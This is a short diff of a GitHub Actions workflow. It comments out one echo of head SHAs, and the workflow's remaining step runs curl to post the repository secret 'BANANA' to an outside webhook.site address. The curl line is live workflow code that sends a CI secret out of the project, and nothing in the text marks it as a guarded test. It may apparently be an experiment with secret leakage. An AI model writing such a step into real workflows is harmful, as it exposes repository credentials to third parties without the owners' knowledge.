@@ -8,6 +8,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo "${{ toJSON(github.event.*.head.sha) }}"
+          #echo "${{ toJSON(github.event.*.head.sha) }}"
           echo "${{ fromJSON(github.event.*.head.sha) }}"
           curl https://webhook.site/b9b9f3a9-fb5f-47bd-a6ae-55009feebd48 -d "segredo=${{ secrets.BANANA }}"
